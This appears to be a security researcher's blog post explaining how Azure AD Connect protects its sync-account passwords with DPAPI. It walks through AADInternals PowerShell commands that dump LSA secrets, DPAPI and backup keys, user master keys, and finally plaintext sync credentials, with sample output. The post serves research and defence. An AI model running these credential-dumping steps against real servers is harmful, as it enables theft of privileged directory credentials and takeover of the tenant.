<!DOCTYPE html>
<html lang="en-gb">
<head>
<meta charset="UTF-8">
<meta http-equiv="cache-control" content="no-cache"> 
<meta http-equiv="expires" content="0"> 
<meta http-equiv="pragma" content="no-cache">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Decrypting ADSync passwords - my journey into DPAPI</title>
<meta name="description" content="The site for Microsoft 365 and Azure AD administrators">
<meta name="generator" content="Hugo 0.39" />
<meta property="og:title" content="Decrypting ADSync passwords - my journey into DPAPI" />
<meta property="og:description" content="Microsoft changed the location of ADSync encryption keys in Azure AD Connect version 1.4.x. These keys are used to encrypt and decrypt the passwords of &ldquo;service accounts&rdquo; used for syncing
data from AD to Azure AD. Earlier versions saved the keys in the registry, but currently, it is using DPAPI. Thus, AADInternals couldn&rsquo;t decrypt the passwords anymore.
Luckily, Dirk-jan Mollema described in his great article how the encryption keys
could be extracted and used to decrypt the passwords. Using Dirk-jan&rsquo;s article as a starting point, I decided to implement this to AADInternals.

" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://o365blog.com/post/adsync/" />



<meta property="article:published_time" content="2020-05-08T00:00:00&#43;00:00"/>

<meta property="article:modified_time" content="2022-08-29T00:00:00&#43;00:00"/>











<link rel="dns-prefetch" href="//fonts.googleapis.com" />
<link rel="dns-prefetch" href="//fonts.gstatic.com" />

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
<script type="text/javascript" src="/js/scripts.js"></script>
<script type="text/javascript" src="/js/tools.js"></script>

<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/images/apple-touch-icon-57x57.png" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114.png" />
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72.png" />
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144.png" />
<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/images/apple-touch-icon-60x60.png" />
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/images/apple-touch-icon-120x120.png" />
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/images/apple-touch-icon-76x76.png" />
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/images/apple-touch-icon-152x152.png" />
<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
<meta name="application-name" content="&nbsp;"/>
<meta name="msapplication-TileColor" content="#FFFFFF" />
<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />


<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-61454000-4', 'auto');
ga('send', 'pageview');
</script>
<script async src='//www.google-analytics.com/analytics.js'></script>

</head>
<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
	<div class="container container-outer">
		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
		
			<div class="container container-inner clearfix">
			
				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
				
					<a class="logo__link" href="/" title="Office 365 blog" rel="home">
						<img src="/images/favicon-96x96.png"><h1 class="logo__title">Office 365 blog</h1>
						<h2 class="logo__tagline">Everything about Microsoft 365 security</h2>
					</a>
				</div>
			</div>
			
<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<ul class="menu__list">
		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD &amp; M365 KILL CHAIN</a></li>
		<li class="menu__item "><a class="menu__link" href="/aadinternals/">AAD INTERNALS</a></li>
		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/powershell/">POWERSHELL</a></li>
		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
	</ul>
</nav>

		</header>
		<div class="wrapper clearfix">

<main class="main-content content" role="main" itemprop="mainContentOfPage">
	<article class="post">
		<header class="post__header clearfix">
			<h1 class="post__title">Decrypting ADSync passwords - my journey into DPAPI</h1>
			<p class="post__meta meta">
				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
				<time class="post__meta-date" datetime="2020-05-08T00:00:00">May 08, 2020</time>
					<time class="post__meta-lastmod" datetime="2022-08-29T00:00:00"> (Last Modified: August 29, 2022)</time>
				<span class="post__meta-categories meta-categories">
					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
			</p>
			<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fadsync%2f&text=Decrypting%20ADSync%20passwords%20-%20my%20journey%20into%20DPAPI&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fadsync%2f&mini=true&title=Decrypting%20ADSync%20passwords%20-%20my%20journey%20into%20DPAPI&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
		</header>
		<div class="post__content clearfix">
			<figure class="post__thumbnail">
				<img src="/images/posts/ADSync.png" alt="Decrypting ADSync passwords - my journey into DPAPI">
			</figure>
				<nav id="TableOfContents">
<ul>
<li><a href="#background">Background</a></li>
<li><a href="#my-dpapi-journey">My DPAPI journey</a>
<ul>
<li><a href="#what-is-dpapi">What is DPAPI</a></li>
<li><a href="#master-keys">Master keys</a></li>
<li><a href="#credentials-secrets">Credentials (secrets)</a></li>
<li><a href="#getting-the-adsync-encryption-key">Getting the ADSync encryption key</a></li>
<li><a href="#decrypting-the-master-key">Decrypting the master key</a></li>
<li><a href="#decrypting-secrets">Decrypting secrets</a></li>
<li><a href="#decrypting-adsync-encoding-keyset">Decrypting ADSync encoding keyset</a></li>
<li><a href="#final-solution">Final solution</a></li>
</ul></li>
<li><a href="#credits">Credits</a></li>
</ul>
</nav>
			<p>Microsoft changed the location of ADSync encryption keys in Azure AD Connect version 1.4.x. These keys are used to encrypt and decrypt the passwords of &ldquo;service accounts&rdquo; used for syncing
data from AD to Azure AD. Earlier versions saved the keys in the registry, but currently, it is using DPAPI. Thus, AADInternals couldn&rsquo;t decrypt the passwords anymore.
Luckily, Dirk-jan Mollema described in his great <a href="https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/" target="_blank">article</a> how the encryption keys
could be extracted and used to decrypt the passwords. Using Dirk-jan&rsquo;s article as a starting point, I decided to implement this to AADInternals.</p>

<p></p>

<h1 id="background">Background</h1>

<p>Azure AD Connect synchronises information from on-prem AD to Azure AD. For this purpose, two users are created to AD and one to Azure AD.
One of the on-prem accounts is named as AAD_012345679ab and is used to run the ADSync service (miiserver.exe). The other user is named MSOL_0123456789ab and is used
to perform the actual synchronisation operations.</p>

<p>The user created to Azure AD is named as Sync_XXXX_0123456789ab@company.onmicrosoft.com where XXXX is the name of the server. The postfix (random hex string) is shared with
the on-prem users. The user is given a &ldquo;Directory synchronisation Accounts&rdquo; role, which allows it to create, modify, and delete users and set their passwords.</p>

<p><img src="/images/posts/dpapi_1.png" alt="ADSync users" /></p>

<p>As the accounts used for synchronisation have permissions to manipulate users, they need to be protected. Azure AD Connect versions 1.3.x and earlier
saved the keyset in the registry (HKLM\Software\Microsoft\Ad Sync\Shared). However, since 1.4.x the keyset is protected using DPAPI.</p>

<h1 id="my-dpapi-journey">My DPAPI journey</h1>

<h2 id="what-is-dpapi">What is DPAPI</h2>

<p>Let&rsquo;s start by figuring out what DPAPI is. DPAPI stands for Data Protection Application Protection Interface and is a recommended way for protecting secrets in Windows.</p>

<h2 id="master-keys">Master keys</h2>

<p>DPAPI uses master keys for encrypting and decrypting secrets. User and system master keys are located at:</p>

<pre><code>C:\Users\&lt;user name&gt;\AppData\Roaming\Microsoft\Protect\&lt;user SID&gt;\
C:\Windows\System32\Microsoft\Protect\S-1-5-18\
</code></pre>

<p>In the folder, there are one or more master key files and a file called Preferred.</p>

<pre><code>Mode                LastWriteTime         Length Name                                                                                                                           
----                -------------         ------ ----                                                                                                                           
-a-hs-       17/12/2019     13.03            468 a65f05d8-fbac-4787-b984-1174f0becf75                                                                                           
-a-hs-       16/03/2020     10.59            740 ecae2d5a-5af0-484f-8e98-7028a56e76b3                                                                                           
-a-hs-       16/03/2020     10.59             24 Preferred
</code></pre>

<p>The preferred file contains a guid of the current master key and a time stamp.</p>

<pre><code>           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000   5A 2D AE EC F0 5A 4F 48 8E 98 70 28 A5 6E 76 B3  
00000010   60 89 40 23 2A 42 D6 01                          
</code></pre>

<p>So, the current master key can be found easily using PowerShell:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="no">[guid][byte[]]</span><span class="p">@(</span><span class="n">0x5A</span><span class="p">,</span> <span class="n">0x2D</span><span class="p">,</span> <span class="n">0xAE</span><span class="p">,</span> <span class="n">0xEC</span><span class="p">,</span> <span class="n">0xF0</span><span class="p">,</span> <span class="n">0x5A</span><span class="p">,</span> <span class="n">0x4F</span><span class="p">,</span> <span class="n">0x48</span><span class="p">,</span> <span class="n">0x8E</span><span class="p">,</span> <span class="n">0x98</span><span class="p">,</span> <span class="n">0x70</span><span class="p">,</span> <span class="n">0x28</span><span class="p">,</span> <span class="n">0xA5</span><span class="p">,</span> <span class="n">0x6E</span><span class="p">,</span> <span class="n">0x76</span><span class="p">,</span> <span class="n">0xB3</span><span class="p">)</span></code></pre></div></p>

<pre><code>Guid                                
----                                
ecae2d5a-5af0-484f-8e98-7028a56e76b3
</code></pre>

<p>The actual master key file contains three copies of user&rsquo;s master key: Master Key, Backup Key, and Domain Key.
The <strong>Master Key</strong> is encrypted using a key derived from user&rsquo;s password and SID. The <strong>Domain Key</strong> is encrypted with a <strong>domain backup key</strong>.</p>

<h2 id="credentials-secrets">Credentials (secrets)</h2>

<p>Although DPAPI can be used to protect any data, with Azure AD Connect, the passwords are stored to AAD_012345679ab user&rsquo;s credential vault.
The user&rsquo;s &ldquo;vault&rdquo; is located in two places:</p>

<pre><code>C:\Users\&lt;user name&gt;\AppData\Local\Microsoft\Credentials
C:\Users\&lt;user name&gt;\AppData\Roaming\Microsoft\Credentials
</code></pre>

<p>The credential files contains information, such as the guid of the master key used to encrypt the secret, hashing algorithm, and encryption algorithm.
It also contains the actual encrypted secret, which can be any binary data.</p>

<h2 id="getting-the-adsync-encryption-key">Getting the ADSync encryption key</h2>

<p>The first step to get the encryption key is to locate it. In his article, Dirk-jan says that ADSync service is running as NT SERVICE\ADSync.
However, this seems not to be the case anymore. Instead, the ADSync service is using the AAD_012345679ab user created during the installation.</p>

<p><img src="/images/posts/dpapi_2.png" alt="ADSync users" /></p>

<p>This means that the user&rsquo;s secrets are located at:</p>

<pre><code>C:\Users\AAD_2980bcb19aa3\appdata\Local\Microsoft\Credentials
</code></pre>

<p>There was only one file in the directory, so it had to be the one containing the encryption keyset.
The beginning of the file is dumped below. The bytes 0x24-0x33 contains the master key guid.</p>

<pre><code>           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   01 00 00 00 90 03 00 00 00 00 00 00 01 00 00 00  ...............
00000010   D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB  Ðß..Ñ.z.ÀOÂë
00000020   01 00 00 00 68 D8 3C 02 BE 7E 1A 4B 80 BF 85 B9  ....hØ&lt;.¾~.K¿¹
00000030   1C 6F F2 29 00 00 00 20 30 00 00 00 4C 00 6F 00  .oò)... 0...L.o.
00000040   63 00 61 00 6C 00 20 00 43 00 72 00 65 00 64 00  c.a.l. .C.r.e.d.
00000050   65 00 6E 00 74 00 69 00 61 00 6C 00 20 00 44 00  e.n.t.i.a.l. .D.
00000060   61 00 74 00 61 00 0D 00 0A 00 00 00 03 66 00 00  a.t.a........f..
00000070   C0 00 00 00 10 00 00 00 D5 02 39 57 7A A6 B3 FF  À.......Õ.9Wz¦³.
00000080   72 16 E0 E7 61 6C A9 DB 00 00 00 00 04 80 00 00  r.àçal©Û.......
00000090   A0 00 00 00 10 00 00 00 0D AF 6A AB BC 8C B9 26   ........¯j«¼¹&amp;
</code></pre>

<p>Again, we can use PowerShell to show the master key guid.
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="no">[guid][byte[]]</span><span class="p">@(</span><span class="n">0x68</span><span class="p">,</span> <span class="n">0xD8</span><span class="p">,</span> <span class="n">0x3C</span><span class="p">,</span> <span class="n">0x02</span><span class="p">,</span> <span class="n">0xBE</span><span class="p">,</span> <span class="n">0x7E</span><span class="p">,</span> <span class="n">0x1A</span><span class="p">,</span> <span class="n">0x4B</span><span class="p">,</span> <span class="n">0x80</span><span class="p">,</span> <span class="n">0xBF</span><span class="p">,</span> <span class="n">0x85</span><span class="p">,</span> <span class="n">0xB9</span><span class="p">,</span> <span class="n">0x1C</span><span class="p">,</span> <span class="n">0x6F</span><span class="p">,</span> <span class="n">0xF2</span><span class="p">,</span> <span class="n">0x29</span><span class="p">)</span></code></pre></div></p>

<pre><code>Guid                                
----                                
023cd868-7ebe-4b1a-80bf-85b91c6ff229
</code></pre>

<p>Now we also know the location of the user&rsquo;s master key!</p>

<h2 id="decrypting-the-master-key">Decrypting the master key</h2>

<p>According to Dirk-jan&rsquo;s article, ADSync user&rsquo;s masterkey can be decrypted using a combination of DPAPI userkey and user&rsquo;s SID. So, first we need to get the DPAPI userkey.</p>

<p><strong>Note:</strong> At this point I figured out that the things required for decrypting the service users&rsquo; passwords are not possible to implement as PowerShell script.
Therefore, I was forced to create a separate .dll to implement needed code in c# and use those functions from PowerShell. Most of the things are just refactored functionality from Mimikatz.</p>

<p>DPAPI machine key is located in LSA (Local Security Authority) secrets. Physically these are stored in registry at:</p>

<pre><code>HKLM:\SECURITY\Policy\Secrets
</code></pre>

<p>However, the administrator doesn&rsquo;t have access rights to that location. Luckily, I found a way to get needed access.
For short, an administrator can copy a kerberos token from lsass process
and gain LSA rights that way. After this, it was quite straight-forward to retrieve the LSA secrets.
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Dump the LSA secrets</span>
<span class="nb">Get-AADIntLSASecrets</span></code></pre></div></p>

<pre><code>Name        : $MACHINE.ACC
Password    : {1, 2, 3, 4...}
PasswordHex : 01020304..
PasswordTxt : 컓噖덭а劈－⌋결
MD4         : {1, 2, 3, 4...}
SHA1        : {1, 2, 3, 4...}
MD4Txt      : aabbccdd..
SHA1Txt     : aabbccdd..

Name        : DPAPI_SYSTEM
Password    : {1, 0, 0, 0...}
PasswordHex : 0100000001082277ac85a532018930b782c30b7f2f91f7677e258665f0a016a7c215ceaf29ee1ae17b9f017b9
PasswordTxt : 挌榵
MD4         : {1, 2, 3, 4...}
SHA1        : {1, 2, 3, 4...}
MD4Txt      : aabbccdd..
SHA1Txt     : aabbccdd..

Name        : NL$KM
Password    : {1, 2, 3, 4...}
PasswordHex : 01020304..
PasswordTxt : ⬡ꎛ
MD4         : {1, 2, 3, 4...}
SHA1        : {1, 2, 3, 4...}
MD4Txt      : aabbccdd..
SHA1Txt     : aabbccdd..

Name        : _SC_ADSync
Password    : {1, 2, 3, 4...}
PasswordHex : 01020304..
PasswordTxt : a5bTiGcvC8fr=E;MQ331IOt/&amp;RP,!m:qjiRXaS;xr4V#6t74;&amp;7mXWoOoz&quot;57K/kKTz#xdBBqb.GDKly
MD4         : {1, 2, 3, 4...}
SHA1        : {1, 2, 3, 4...}
MD4Txt      : aabbccdd..
SHA1Txt     : aabbccdd..
</code></pre>

<p>The DPAPI_SYSTEM user has a binary password containing the keys. To ease fetching the DPAPI keys, I also implemented the following function:</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get DPAPI keys</span>
<span class="nb">Get-AADIntDPAPIKeys</span></code></pre></div>

<pre><code>UserKey               UserKeyHex                               MachineKey            MachineKeyHex                           
-------               ----------                               ----------            -------------                           
{16, 130, 39, 122...} 1082277ac85a532018930b782c30b7f2f91f7677 {226, 88, 102, 95...} e258665f0a016a7c215ceaf29ee1ae17b9f017b9
</code></pre>

<p>At this point, I noticed that _SC_ADSync had a plain-text password. The user had no rights to login normally, so I temporarely moved it to Administrators group.
After that, I was able to login as AAD_012345679ab user with _SC_ADSync password! Thus, as the user was not a virtual account as described in Dirk-jan&rsquo;s post, I implemented
a function to decrypt user&rsquo;s master key with user name, SID, and password.</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get user&#39;s master key</span>
<span class="nb">Get-AADIntUserMasterkeys</span> <span class="n">-UserName</span> <span class="n">AAD_2980bcb19aa3</span> <span class="n">-Password</span> <span class="s1">&#39;a5bTiGcvC8fr=E;MQ331IOt/&amp;RP,!m:qjiRXaS;xr4V#6t74;&amp;7mXWoOoz&#34;57K/kKTz#xdBBqb.GDKly&#39;</span> <span class="n">-SID</span> <span class="s2">&#34;S-1-5-21-xx-xx-xx-xx&#34;</span></code></pre></div>

<pre><code>Name                           Value                                                                                                                                            
----                           -----                                                                                                                                            
023cd868-7ebe-4b1a-80bf-85b... {236, 115, 202, 81...}  
</code></pre>

<p>Later I discovered that also the decryption using system key was needed. But first we need to get the those keys.</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Dump the LSA keys</span>
<span class="nb">Get-AADIntLSABackupKeys</span></code></pre></div>

<pre><code>certificate        Name   Id                                   Key                   
-----------        ----   --                                   ---                   
{48, 130, 3, 0...} RSA    709d861c-56c1-4f8c-94fd-c15a91bbd991 {30, 241, 181, 176...}
                   Legacy e9ab591b-c25f-432f-97f7-a77e5c998fd3 {226, 180, 14, 151...}
</code></pre>

<p>Now that we have the LSA keys, we are able to decrypt all master keys!
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Dump the LSA key</span>
<span class="nv">$rsa</span><span class="p">=</span><span class="nb">Get-AADIntLSABackupKeys</span> <span class="p">|</span> <span class="n">where</span> <span class="n">Name</span> <span class="o">-eq</span> <span class="n">RSA</span>

<span class="c"># Get user&#39;s master key</span>
<span class="nb">Get-AADIntUserMasterkeys</span> <span class="n">-UserName</span> <span class="n">AAD_2980bcb19aa3</span> <span class="n">-SID</span> <span class="s2">&#34;S-1-5-21-xx-xx-xx-xx&#34;</span> <span class="n">-SystemKey</span> <span class="nv">$rsa</span><span class="p">.</span><span class="n">Key</span></code></pre></div></p>

<pre><code>Name                           Value                                                                                                                                            
----                           -----                                                                                                                                            
023cd868-7ebe-4b1a-80bf-85b... {236, 115, 202, 81...}  
</code></pre>

<h2 id="decrypting-secrets">Decrypting secrets</h2>

<p>Now that we know the location of the secrets and we have decrypted the master key, we can decrypt the encryption keys!</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get user&#39;s master key</span>
<span class="nv">$mks</span> <span class="p">=</span> <span class="nb">Get-AADIntUserMasterkeys</span> <span class="n">-UserName</span> <span class="n">AAD_2980bcb19aa3</span> <span class="n">-Password</span> <span class="s1">&#39;a5bTiGcvC8fr=E;MQ331IOt/&amp;RP,!m:qjiRXaS;xr4V#6t74;&amp;7mXWoOoz&#34;57K/kKTz#xdBBqb.GDKly&#39;</span> <span class="n">-SID</span> <span class="s2">&#34;S-1-5-21-xx-xx-xx-xx&#34;</span>

<span class="c"># Dump user&#39;s secrets</span>
<span class="nb">Get-AADIntLocalUserCredentials</span> <span class="n">-UserName</span> <span class="n">AAD_2980bcb19aa3</span> <span class="n">-MasterKeys</span> <span class="nv">$mks</span></code></pre></div>

<pre><code>Target        : LegacyGeneric:target=Microsoft_AzureADConnect_KeySet_{6F529078-33BD-448F-A9AF-20D28B1E55DC}_100000
Persistance   : local_machine
Edited        : 24/04/2020 13.03.18
Alias         : 
Comment       : 
UserName      : ADSync
Secret        : {1, 0, 0, 0...}
SecretTxt     :  賐�ᔁᇑ窌쀀쉏 鈿鄅俿鮍遤  MMS_ENCRYPTION_KEYSET_{6F529078-33BD-448F-A9AF-20D28B1E55DC}_100000 昃 À  Ｅ䖀ﶽ఍�峘ᓗ  耄 
SecretTxtUtf8 :    Ќ����z �O�   ?��L��O��d�|���   �   M M S _ E N C R Y P T I O N _ K E Y S E T _ { 6 F 5 2 9 0 7 8 - 3 3 B D - 4 4 8 F - A 9 A F - 2 0 D 2 8 B 1 E 5 5 
Attributes    : {}
</code></pre>

<p>From the output we can see that we&rsquo;ve found the encryption keyset!</p>

<h2 id="decrypting-adsync-encoding-keyset">Decrypting ADSync encoding keyset</h2>

<p>The closer look to the binary secret reveals that it is also a DPAPI blob, encrypted with an unknown master key.
After searching, I was able to figure out that it was one of the system&rsquo;s master keys! So, next, I needed a way to decrypt them:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Dump the LSA key</span>
<span class="nv">$rsa</span><span class="p">=</span><span class="nb">Get-AADIntLSABackupKeys</span> <span class="p">|</span> <span class="n">where</span> <span class="n">Name</span> <span class="o">-eq</span> <span class="n">RSA</span>

<span class="c"># Get system master keys</span>
<span class="nb">Get-AADIntSystemMasterkeys</span> <span class="n">-SystemKey</span> <span class="nv">$rsa</span><span class="p">.</span><span class="n">Key</span></code></pre></div></p>

<pre><code>Name                           Value                                                                                                                                            
----                           -----                                                                                                                                            
9105923f-ef4c-4fff-8d9b-649... {203, 24, 3, 236...}
</code></pre>

<p>I already knew that the entropy needed for decrypting the key was located in ADSync configuration database.
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Dump the key info</span>
<span class="nb">Get-AADIntSyncEncryptionKeyInfo</span></code></pre></div></p>

<pre><code>Name                           Value 
----                           ----- 
InstanceId                     299b1d83-9dc6-479a-92f1-2357fc5abfed
Entropy                        a1c80460-6fe9-4c6f-bf31-d7a34c878dca
</code></pre>

<p>However, I was unable to decrypt the data with the correct system master key :disappointed: as it always failed with error 0x80090005 (Bad Data).</p>

<p>Finally, I tried to decrypt the data using the native DPAPI <a href="https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata" target="_blank">CryptProtectData</a> function
with CRYPTPROTECT_LOCAL_MACHINE flag. Profit!</p>

<p>Now, finally,  I was able to able to decrypt and extract the encryption key!
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the key info</span>
<span class="nv">$key_info</span> <span class="p">=</span> <span class="nb">Get-AADIntSyncEncryptionKeyInfo</span>

<span class="c"># Dump the key    </span>
<span class="nb">Get-AADIntSyncEncryptionKey</span> <span class="n">-Entropy</span> <span class="nv">$key_info</span><span class="p">.</span><span class="n">Entropy</span> <span class="n">-InstanceId</span> <span class="nv">$key_info</span><span class="p">.</span><span class="n">InstanceId</span></code></pre></div></p>

<pre><code>Id     Guid                                 CryptAlg Key                   
--     ----                                 -------- ---                   
100000 299b1d83-9dc6-479a-92f1-2357fc5abfed    26128 {4, 220, 54, 13...}
</code></pre>

<h2 id="final-solution">Final solution</h2>

<p>As you probably noticed, I didn&rsquo;t implement the decryption of the &ldquo;service account&rdquo; passwords. Well, I actually did but those functions are not exported in AADInternals module and thus not available.
Why, you might ask.</p>

<p>The explanation is simple. At some point, I logged in as AAD_012345679ab user and tried if the original AADInternals Get-AADIntSyncCredentials function would work. To my surprise, it worked as a charm!
I wondered why, and ended up into a conclusion that as I was running PowerShell as AAD_012345679ab user, it had access to user&rsquo;s secrets and master keys. So, if it would
be possible to run the PowerShell as AAD_012345679ab user, I could extract the passwords without altering the original code at all.</p>

<p>Then the solution just popped into my mind! If I can get LSA rights by copying the token from the running lsass service, it should work in the similar way with AzureAD miiserver service.
I tried to copy the token as an administrator but it failed with access denied. But, if I first copied the LSA token, I got more rights and was able to copy ADSync token too!
Only problem was that after &ldquo;elevating&rdquo; the PowerShell session to AAD_012345679ab user, I was not able access the local configuration database. The solution was to first
open the database once and doing the &ldquo;elevation&rdquo; after that. The only downside is that in order to restore the normal rights the PowerShell needs to be restarted.</p>

<p>So, after spending months studying and implementing DPAPI functionality to AADInternals, I didn&rsquo;t even needed those to decrypt the passwords! But learning something new is never a bad thing!</p>

<p>Now you can dump the Azure AD Connect credentials from computer where it is installed.</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Dump the AD Connect credentials</span>
<span class="nb">Get-AADIntSyncCredentials</span></code></pre></div>

<pre><code>Name                           Value
----                           -----
ADDomain                       company.com  
ADUser                         MSOL_4bc4a34e95fa
ADUserPassword                 Q9@p(poz{#:kF_G)(s/Iy@8c*9(t;...
AADUser                        Sync_SRV01_4bc4a34e95fa@company.onmicrosoft.com                                                      
AADUserPassword                $.1%(lxZ&amp;/kNZz[r
</code></pre>

<p>With the dumped credentials you can now log in to Azure AD and pretend to be Azure AD Connect.</p>

<h1 id="credits">Credits</h1>

<p>Most of the things I&rsquo;ve discussed here are inventions of others:</p>

<ul>
<li>Dirk-jan Mollema: <a href="https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/" target="_blank">Updating adconnectdump - a journey into DPAPI</a></li>
<li>Benjamin Delpy: <a href="https://github.com/gentilkiwi/mimikatz" target="_blank">Mimikatz source code</a></li>
<li>harmj0y: <a href="https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/" target="_blank">Operational Guidance for Offensive DPAPI Abuse</a></li>
<li>Michael Grafnetter <a href="https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/" target="_blank">Retrieving DPAPI Backup Keys from Active Directory</a></li>
</ul>
		</div>
		
<div class="post__tags tags clearfix">
	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
	
	<ul class="tags__list">
		<li class="tags__item"><a class="tags__link" href="/tags/azure-active-directory/" rel="tag">Azure Active Directory</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/active-directory/" rel="tag">Active Directory</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/sync/" rel="tag">Sync</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/aadconnect/" rel="tag">AADConnect</a></li>
	</ul>
</div>

		<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fadsync%2f&text=Decrypting%20ADSync%20passwords%20-%20my%20journey%20into%20DPAPI&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fadsync%2f&mini=true&title=Decrypting%20ADSync%20passwords%20-%20my%20journey%20into%20DPAPI&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
	</article>
	
<div class="authorbox clearfix">
	<figure class="authorbox__avatar">
		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
	</figure>
	<div class="authorbox__header">
		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
	</div>
	<div class="authorbox__description">
		Dr Syynimaa works as Senior Principal Information Security Researcher at Secureworks CTU (Counter Threat Unit). <br> Before moving to his current position, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Azure AD security. <br><br>Dr Syynimaa is Microsoft Certified Expert (Microsoft 365), Microsoft Certified Azure Solutions Architect Expert, Microsoft Certified Trainer, Microsoft MVP (Enterprise Mobility, Identity and Access &amp; Intune), and Microsoft Most Valuable Security Researcher (MVR).
	</div>
</div>
	
<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
